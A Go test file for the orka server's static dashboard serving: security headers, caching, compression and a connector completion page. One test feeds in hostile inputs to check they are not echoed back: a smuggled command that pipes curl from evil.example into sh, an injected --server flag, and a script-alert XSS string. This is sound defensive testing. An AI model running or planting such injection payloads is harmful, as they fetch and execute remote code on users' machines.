/*
Copyright (c) 2026.

MIT License - see LICENSE file for details.
*/

package api

import (
	"crypto/sha256"
	"encoding/base64"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"testing/fstest"

	"github.com/gofiber/fiber/v3"
	"github.com/valyala/fasthttp"
	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"sigs.k8s.io/controller-runtime/pkg/client/fake"

	corev1alpha1 "github.com/orka-agents/orka/api/v1alpha1"
)

func TestSetupStaticFiles_IndexHTML(t *testing.T) {
	scheme := runtime.NewScheme()
	_ = corev1alpha1.AddToScheme(scheme)
	_ = corev1.AddToScheme(scheme)
	fakeClient := fake.NewClientBuilder().WithScheme(scheme).Build()

	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080, DashboardEnabled: true})

	req := httptest.NewRequest(http.MethodGet, "/", nil)
	resp, err := server.app.Test(req)
	if err != nil {
		t.Fatalf("Test request failed: %v", err)
	}

	if resp.StatusCode != http.StatusOK {
		t.Errorf("StatusCode = %d, want %d", resp.StatusCode, http.StatusOK)
	}

	ct := resp.Header.Get("Content-Type")
	if !strings.Contains(ct, "text/html") {
		t.Errorf("Content-Type = %s, want text/html", ct)
	}
}

func TestSetupStaticFiles_SPARoutes(t *testing.T) {
	scheme := runtime.NewScheme()
	_ = corev1alpha1.AddToScheme(scheme)
	_ = corev1.AddToScheme(scheme)
	fakeClient := fake.NewClientBuilder().WithScheme(scheme).Build()

	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080, DashboardEnabled: true})

	spaRoutes := []string{
		"/login",
		"/tasks",
		"/tasks/some-task-id",
		"/sessions",
		"/sessions/some-session-id",
		"/agents",
		"/agents/my-agent",
		"/tools",
		"/tools/my-tool",
	}

	for _, route := range spaRoutes {
		t.Run(route, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodGet, route, nil)
			resp, err := server.app.Test(req)
			if err != nil {
				t.Fatalf("Test request failed: %v", err)
			}
			if resp.StatusCode != http.StatusOK {
				t.Errorf("StatusCode = %d, want %d", resp.StatusCode, http.StatusOK)
			}
			ct := resp.Header.Get("Content-Type")
			if !strings.Contains(ct, "text/html") {
				t.Errorf("Content-Type = %s, want text/html", ct)
			}
		})
	}
}

func TestSetupStaticFiles_Favicon(t *testing.T) {
	scheme := runtime.NewScheme()
	_ = corev1alpha1.AddToScheme(scheme)
	_ = corev1.AddToScheme(scheme)
	fakeClient := fake.NewClientBuilder().WithScheme(scheme).Build()

	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080, DashboardEnabled: true})

	req := httptest.NewRequest(http.MethodGet, "/favicon.svg", nil)
	resp, err := server.app.Test(req)
	if err != nil {
		t.Fatalf("Test request failed: %v", err)
	}

	// Favicon may or may not exist in stub embed; check it doesn't panic
	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusNotFound {
		t.Errorf("StatusCode = %d, want 200 or 404", resp.StatusCode)
	}
}

func TestSetupStaticFiles_Assets(t *testing.T) {
	scheme := runtime.NewScheme()
	_ = corev1alpha1.AddToScheme(scheme)
	_ = corev1.AddToScheme(scheme)
	fakeClient := fake.NewClientBuilder().WithScheme(scheme).Build()

	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080, DashboardEnabled: true})

	tests := []struct {
		name        string
		path        string
		wantCT      string
		expectExist bool
	}{
		{"JS asset", "/assets/main.js", "application/javascript", false},
		{"CSS asset", "/assets/style.css", "text/css", false},
		{"other asset", "/assets/image.png", "application/octet-stream", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodGet, tt.path, nil)
			resp, err := server.app.Test(req)
			if err != nil {
				t.Fatalf("Test request failed: %v", err)
			}

			// Assets may not exist in test embed, but the route handler should respond
			if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusNotFound {
				t.Errorf("StatusCode = %d, want 200 or 404", resp.StatusCode)
			}
		})
	}
}

func TestSetupStaticFiles_DoesNotInterfereWithAPI(t *testing.T) {
	scheme := runtime.NewScheme()
	_ = corev1alpha1.AddToScheme(scheme)
	_ = corev1.AddToScheme(scheme)
	fakeClient := fake.NewClientBuilder().WithScheme(scheme).Build()

	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080, DashboardEnabled: true})

	// Health endpoints should still work
	req := httptest.NewRequest(http.MethodGet, "/healthz", nil)
	resp, err := server.app.Test(req)
	if err != nil {
		t.Fatalf("Test request failed: %v", err)
	}
	if resp.StatusCode != http.StatusOK {
		t.Errorf("healthz StatusCode = %d, want %d", resp.StatusCode, http.StatusOK)
	}

	// API endpoints should still require auth
	req = httptest.NewRequest(http.MethodGet, "/api/v1/tasks", nil)
	resp, err = server.app.Test(req)
	if err != nil {
		t.Fatalf("Test request failed: %v", err)
	}
	if resp.StatusCode != http.StatusUnauthorized {
		t.Errorf("API StatusCode = %d, want %d", resp.StatusCode, http.StatusUnauthorized)
	}
}

func TestSetupStaticFiles_IndexContent(t *testing.T) {
	scheme := runtime.NewScheme()
	_ = corev1alpha1.AddToScheme(scheme)
	_ = corev1.AddToScheme(scheme)
	fakeClient := fake.NewClientBuilder().WithScheme(scheme).Build()

	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080, DashboardEnabled: true})

	req := httptest.NewRequest(http.MethodGet, "/", nil)
	resp, err := server.app.Test(req)
	if err != nil {
		t.Fatalf("Test request failed: %v", err)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatalf("Failed to read body: %v", err)
	}

	// The embedded stub has content (at least "x\n")
	if len(body) == 0 {
		t.Error("expected non-empty body for index.html")
	}
}

func TestSPAContentSecurityPolicyHashesInlineScripts(t *testing.T) {
	inline := "\n      document.documentElement.classList.add('dark')\n    "
	html := "<!doctype html><html><head>" +
		"<script>" + strings.ReplaceAll(inline, "\n", "\r\n") + "</script>" +
		`<script type="module" crossorigin src="/assets/index-abc.js"></script>` +
		"</head><body></body></html>"

	csp := spaContentSecurityPolicy([]byte(html))

	// The browser hashes the inline text after normalizing CRLF to LF; the
	// external module script is covered by 'self' and gets no hash.
	sum := sha256.Sum256([]byte(inline))
	wantHash := "'sha256-" + base64.StdEncoding.EncodeToString(sum[:]) + "'"
	if want := "script-src 'self' " + wantHash + ";"; !strings.Contains(csp, want) {
		t.Fatalf("CSP = %q, want script-src %q", csp, want)
	}
	if got := strings.Count(csp, "'sha256-"); got != 1 {
		t.Fatalf("CSP has %d script hashes, want 1: %q", got, csp)
	}
	for _, directive := range []string{
		"default-src 'self'", "style-src 'self' 'unsafe-inline'", "img-src 'self' data:",
		"font-src 'self' data:", "connect-src 'self'", "frame-ancestors 'none'",
		"base-uri 'self'", "form-action 'self'", "object-src 'none'",
	} {
		if !strings.Contains(csp, directive) {
			t.Errorf("CSP = %q, missing %q", csp, directive)
		}
	}

	if got := spaContentSecurityPolicy([]byte("<html><body>stub</body></html>")); !strings.Contains(got, "script-src 'self';") {
		t.Fatalf("CSP without inline scripts = %q, want bare script-src 'self'", got)
	}
}

// newStaticTestServer serves distFS through the production static routes and
// error handler, with one large API response to prove compression is scoped.
func newStaticTestServer(t *testing.T, distFS fstest.MapFS) *Server {
	t.Helper()
	index, ok := newSPAIndexPage(distFS)
	if !ok {
		t.Fatal("test FS has no index.html")
	}
	server := &Server{app: fiber.New(fiber.Config{ErrorHandler: customErrorHandler})}
	server.app.Get("/api/v1/large", func(c fiber.Ctx) error {
		return c.JSON(fiber.Map{"items": strings.Repeat("task ", 200)})
	})
	server.registerStaticFiles(distFS, index)
	return server
}

func staticTestFS() fstest.MapFS {
	return fstest.MapFS{
		"index.html": {Data: []byte("<!doctype html><html><head><script>window.theme = 'dark'</script>" +
			`<script type="module" src="/assets/index-abc.js"></script></head><body>` +
			strings.Repeat("<div></div>", 40) + "</body></html>")},
		"assets/index-abc.js":                 {Data: []byte(strings.Repeat("console.log('orka');\n", 50))},
		"assets/index-abc.css":                {Data: []byte(strings.Repeat("body { color: black; }\n", 50))},
		"assets/inter-latin-400-normal.woff2": {Data: []byte(strings.Repeat("w", 500))},
		"favicon.svg":                         {Data: []byte("<svg></svg>")},
	}
}

func TestStaticFiles_CacheAndSecurityHeaders(t *testing.T) {
	server := newStaticTestServer(t, staticTestFS())
	wantCSP := spaContentSecurityPolicy(staticTestFS()["index.html"].Data)

	tests := []struct {
		name        string
		path        string
		wantType    string
		wantCache   string
		wantSPAPage bool
	}{
		{"hashed script", "/assets/index-abc.js", "application/javascript", staticAssetCacheControl, false},
		{"hashed stylesheet", "/assets/index-abc.css", "text/css", staticAssetCacheControl, false},
		{"font", "/assets/inter-latin-400-normal.woff2", "application/octet-stream", staticAssetCacheControl, false},
		{"favicon", "/favicon.svg", "image/svg+xml", "", false},
		{"root", "/", "text/html; charset=utf-8", "no-cache", true},
		{"registered route", "/tasks/task-1", "text/html; charset=utf-8", "no-cache", true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			resp, err := server.app.Test(httptest.NewRequest(http.MethodGet, tt.path, nil))
			if err != nil {
				t.Fatalf("Test request failed: %v", err)
			}
			if resp.StatusCode != http.StatusOK {
				t.Fatalf("StatusCode = %d, want 200", resp.StatusCode)
			}
			if got := resp.Header.Get("Content-Type"); got != tt.wantType {
				t.Errorf("Content-Type = %q, want %q", got, tt.wantType)
			}
			if got := resp.Header.Get("Cache-Control"); got != tt.wantCache {
				t.Errorf("Cache-Control = %q, want %q", got, tt.wantCache)
			}
			if got := resp.Header.Get("X-Content-Type-Options"); got != "nosniff" {
				t.Errorf("X-Content-Type-Options = %q, want nosniff", got)
			}
			documentHeaders := map[string]string{
				"X-Frame-Options":         "DENY",
				"Referrer-Policy":         "no-referrer",
				"Content-Security-Policy": wantCSP,
			}
			for header, want := range documentHeaders {
				if !tt.wantSPAPage {
					want = ""
				}
				if got := resp.Header.Get(header); got != want {
					t.Errorf("%s = %q, want %q", header, got, want)
				}
			}
		})
	}
}

func TestStaticFiles_MissingAssetIsNotFound(t *testing.T) {
	// A stale chunk reference must fail as a 404, not parse index.html as
	// JavaScript; real UI routes keep the SPA fallback.
	for _, path := range []string{"/assets/index-stale.js", "/assets/nested/index-abc.js", "/assets"} {
		t.Run(path, func(t *testing.T) {
			resp, err := newStaticTestServer(t, staticTestFS()).app.Test(httptest.NewRequest(http.MethodGet, path, nil))
			if err != nil {
				t.Fatalf("Test request failed: %v", err)
			}
			if resp.StatusCode != http.StatusNotFound {
				t.Fatalf("StatusCode = %d, want 404", resp.StatusCode)
			}
			if ct := resp.Header.Get("Content-Type"); strings.Contains(ct, "text/html") {
				t.Fatalf("Content-Type = %q, want a non-HTML error", ct)
			}
			if got := resp.Header.Get("Cache-Control"); got == staticAssetCacheControl {
				t.Fatalf("a missing asset must not be cached as immutable")
			}
			if got := resp.Header.Get("X-Content-Type-Options"); got != "nosniff" {
				t.Fatalf("X-Content-Type-Options = %q, want nosniff", got)
			}
		})
	}
}

// TestStaticFiles_EveryUIRouteIsRegistered derives the dashboard's top-level
// routes from ui/src/routes and checks each is a registered, compressed route
// rather than the error handler's uncompressed fallback.
func TestStaticFiles_EveryUIRouteIsRegistered(t *testing.T) {
	entries, err := os.ReadDir(filepath.Join("..", "..", "ui", "src", "routes"))
	if err != nil {
		t.Fatalf("read UI routes: %v", err)
	}
	var paths []string
	for _, entry := range entries {
		name := entry.Name()
		if !entry.IsDir() {
			route, ok := strings.CutSuffix(name, ".tsx")
			if ok && !strings.HasSuffix(route, ".test") && route != "__root" && route != "index" {
				paths = append(paths, "/"+route)
			}
			continue
		}
		if _, err := os.Stat(filepath.Join("..", "..", "ui", "src", "routes", name, "index.tsx")); err == nil {
			paths = append(paths, "/"+name)
		}
		paths = append(paths, "/"+name+"/example")
	}
	if len(paths) < 10 {
		t.Fatalf("derived only %d UI routes: %v", len(paths), paths)
	}

	server := newStaticTestServer(t, staticTestFS())
	for _, path := range paths {
		t.Run(path, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodGet, path, nil)
			req.Header.Set("Accept-Encoding", "gzip")
			resp, err := server.app.Test(req)
			if err != nil {
				t.Fatalf("Test request failed: %v", err)
			}
			if resp.StatusCode != http.StatusOK || !strings.HasPrefix(resp.Header.Get("Content-Type"), "text/html") {
				t.Fatalf("StatusCode/Content-Type = %d/%q, want the SPA page", resp.StatusCode, resp.Header.Get("Content-Type"))
			}
			if got := resp.Header.Get("Content-Encoding"); got != "gzip" {
				t.Fatalf("Content-Encoding = %q, want gzip from a registered route", got)
			}
			if got := resp.Header.Get("Vary"); !strings.Contains(got, "Accept-Encoding") {
				t.Fatalf("Vary = %q, want Accept-Encoding", got)
			}
		})
	}
}

func TestStaticFiles_CompressionNegotiation(t *testing.T) {
	distFS := staticTestFS()
	server := newStaticTestServer(t, distFS)

	tests := []struct {
		name           string
		path           string
		acceptEncoding string
		wantEncoding   string
		wantBody       []byte
	}{
		{"script gzip", "/assets/index-abc.js", "gzip", "gzip", distFS["assets/index-abc.js"].Data},
		{"script brotli preferred", "/assets/index-abc.js", "gzip, deflate, br", "br", distFS["assets/index-abc.js"].Data},
		{"stylesheet gzip", "/assets/index-abc.css", "gzip", "gzip", distFS["assets/index-abc.css"].Data},
		{"index gzip", "/", "gzip", "gzip", distFS["index.html"].Data},
		{"script identity", "/assets/index-abc.js", "", "", distFS["assets/index-abc.js"].Data},
		{"font is already compressed", "/assets/inter-latin-400-normal.woff2", "gzip, br", "", distFS["assets/inter-latin-400-normal.woff2"].Data},
		{"api response untouched", "/api/v1/large", "gzip, br", "", nil},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodGet, tt.path, nil)
			if tt.acceptEncoding != "" {
				req.Header.Set("Accept-Encoding", tt.acceptEncoding)
			}
			resp, err := server.app.Test(req)
			if err != nil {
				t.Fatalf("Test request failed: %v", err)
			}
			if resp.StatusCode != http.StatusOK {
				t.Fatalf("StatusCode = %d, want 200", resp.StatusCode)
			}
			if got := resp.Header.Get("Content-Encoding"); got != tt.wantEncoding {
				t.Fatalf("Content-Encoding = %q, want %q", got, tt.wantEncoding)
			}
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				t.Fatalf("read body: %v", err)
			}
			switch tt.wantEncoding {
			case "gzip":
				body, err = fasthttp.AppendGunzipBytes(nil, body)
			case "br":
				body, err = fasthttp.AppendUnbrotliBytes(nil, body)
			}
			if err != nil {
				t.Fatalf("decode %s body: %v", tt.wantEncoding, err)
			}
			if tt.wantBody != nil && string(body) != string(tt.wantBody) {
				t.Fatalf("decoded body differs from the served file")
			}
			if tt.wantEncoding != "" && !strings.Contains(resp.Header.Get("Vary"), "Accept-Encoding") {
				t.Fatalf("Vary = %q, want Accept-Encoding", resp.Header.Get("Vary"))
			}
		})
	}
}

func TestSetupStaticFiles_EmbeddedFallbackHeaders(t *testing.T) {
	scheme := runtime.NewScheme()
	_ = corev1alpha1.AddToScheme(scheme)
	_ = corev1.AddToScheme(scheme)
	server := NewServer(fake.NewClientBuilder().WithScheme(scheme).Build(), nil, ServerConfig{Port: 8080, DashboardEnabled: true})

	// An unknown path has no registered route and is served by the error
	// handler's SPA fallback; it carries the same document headers as a
	// registered route.
	for _, path := range []string{"/", "/no-such-page"} {
		resp, err := server.app.Test(httptest.NewRequest(http.MethodGet, path, nil))
		if err != nil {
			t.Fatalf("Test request failed: %v", err)
		}
		if resp.StatusCode != http.StatusOK {
			t.Fatalf("%s StatusCode = %d, want 200", path, resp.StatusCode)
		}
		if got := resp.Header.Get("Cache-Control"); got != "no-cache" {
			t.Errorf("%s Cache-Control = %q, want no-cache", path, got)
		}
		if got := resp.Header.Get("Content-Security-Policy"); !strings.HasPrefix(got, "default-src 'self'; script-src 'self'") {
			t.Errorf("%s Content-Security-Policy = %q", path, got)
		}
		if got := resp.Header.Get("X-Frame-Options"); got != "DENY" {
			t.Errorf("%s X-Frame-Options = %q, want DENY", path, got)
		}
	}

	resp, err := server.app.Test(httptest.NewRequest(http.MethodGet, "/assets/index-missing.js", nil))
	if err != nil {
		t.Fatalf("Test request failed: %v", err)
	}
	if resp.StatusCode != http.StatusNotFound {
		t.Fatalf("missing asset StatusCode = %d, want 404", resp.StatusCode)
	}
}

// newConfiguredTestServer builds the production server from config, so the
// dashboard flag decides which static routes exist.
func newConfiguredTestServer(t *testing.T, config ServerConfig) *Server {
	t.Helper()
	scheme := runtime.NewScheme()
	_ = corev1alpha1.AddToScheme(scheme)
	_ = corev1.AddToScheme(scheme)
	config.Port = 8080
	return NewServer(fake.NewClientBuilder().WithScheme(scheme).Build(), nil, config)
}

func TestSetupStaticFiles_DashboardDisabledByDefault(t *testing.T) {
	server := newConfiguredTestServer(t, ServerConfig{})

	// Without the dashboard, its routes and the SPA fallback are gone: every
	// unrouted path is a JSON 404, the same answer the API paths give.
	for _, path := range []string{"/", "/login", "/tasks", "/settings/connectors", "/some-ui-route", "/assets/main.js", "/favicon.svg"} {
		t.Run(path, func(t *testing.T) {
			resp, err := server.app.Test(httptest.NewRequest(http.MethodGet, path, nil))
			if err != nil {
				t.Fatalf("Test request failed: %v", err)
			}
			if resp.StatusCode != http.StatusNotFound {
				t.Fatalf("StatusCode = %d, want %d", resp.StatusCode, http.StatusNotFound)
			}
			if ct := resp.Header.Get("Content-Type"); !strings.Contains(ct, "application/json") {
				t.Fatalf("Content-Type = %s, want application/json", ct)
			}
		})
	}

	resp, err := server.app.Test(httptest.NewRequest(http.MethodGet, "/healthz", nil))
	if err != nil {
		t.Fatalf("Test request failed: %v", err)
	}
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("healthz StatusCode = %d, want %d", resp.StatusCode, http.StatusOK)
	}
}

func getConnectorCompletionPage(t *testing.T, server *Server, target string) (*http.Response, string) {
	t.Helper()
	resp, err := server.app.Test(httptest.NewRequest(http.MethodGet, target, nil))
	if err != nil {
		t.Fatalf("Test request failed: %v", err)
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatalf("Failed to read body: %v", err)
	}
	return resp, string(body)
}

func TestConnectorCompletionPage_WithoutDashboard(t *testing.T) {
	server := newConfiguredTestServer(t, ServerConfig{Connectors: ConnectorConfig{Enabled: true}})

	resp, body := getConnectorCompletionPage(t, server, connectorSettingsPath+"?status=pending&connection=github-abc123&namespace=team-a")
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("StatusCode = %d, want %d", resp.StatusCode, http.StatusOK)
	}
	for header, want := range map[string]string{
		"Content-Type":            "text/html; charset=utf-8",
		"Cache-Control":           "no-store",
		"Referrer-Policy":         "no-referrer",
		"Content-Security-Policy": "default-src 'none'; frame-ancestors 'none'",
		"X-Content-Type-Options":  "nosniff",
	} {
		if got := resp.Header.Get(header); got != want {
			t.Errorf("%s = %q, want %q", header, got, want)
		}
	}
	if want := "orka connection complete github-abc123 --namespace team-a --completion &lt;value&gt;"; !strings.Contains(body, want) {
		t.Fatalf("body does not show %q:\n%s", want, body)
	}
	if strings.Contains(body, "<script") {
		t.Fatalf("completion page must not run script:\n%s", body)
	}

	_, body = getConnectorCompletionPage(t, server, connectorSettingsPath+"?status=error&reason=scopes_denied&connection=github-abc123")
	if !strings.Contains(body, "Linking failed (scopes_denied).") || strings.Contains(body, "orka connection complete") {
		t.Fatalf("error page should name the reason and offer no completion command:\n%s", body)
	}
}

func TestConnectorCompletionPage_ShowsOnlyValidatedQueryValues(t *testing.T) {
	server := newConfiguredTestServer(t, ServerConfig{Connectors: ConnectorConfig{Enabled: true}})

	// Anyone can send a person this URL, so a query value that is not a
	// Kubernetes name or a reason code must not become part of the command
	// the page tells them to run.
	_, body := getConnectorCompletionPage(t, server, connectorSettingsPath+
		"?status=pending&connection=x%3B%20curl%20evil.example%20%7C%20sh&namespace=a%20--server%20https://evil.example")
	if strings.Contains(body, "evil.example") {
		t.Fatalf("page echoed an unvalidated query value:\n%s", body)
	}
	if !strings.Contains(body, "orka connection complete &lt;name&gt; --completion &lt;value&gt;") || !strings.Contains(body, "orka connection list") {
		t.Fatalf("page should fall back to a placeholder name:\n%s", body)
	}

	for _, reason := range []string{"%3Cscript%3Ealert(1)%3C/script%3E", "disable_authentication_and_retry"} {
		_, body = getConnectorCompletionPage(t, server, connectorSettingsPath+"?status=error&reason="+reason)
		if strings.Contains(body, "alert(1)") || strings.Contains(body, "disable_authentication") || !strings.Contains(body, "Linking failed.") {
			t.Fatalf("page echoed an unknown reason %q:\n%s", reason, body)
		}
	}
}

func TestConnectorCompletionPage_DashboardOwnsThePath(t *testing.T) {
	server := newConfiguredTestServer(t, ServerConfig{DashboardEnabled: true, Connectors: ConnectorConfig{Enabled: true}})

	index, ok := embeddedSPAIndexPage()
	if !ok {
		t.Fatal("embedded index.html is unavailable")
	}
	_, body := getConnectorCompletionPage(t, server, connectorSettingsPath+"?status=pending&connection=github-abc123")
	if body != string(index.html) {
		t.Fatalf("with the dashboard enabled, its page finishes the link instead:\n%s", body)
	}
}
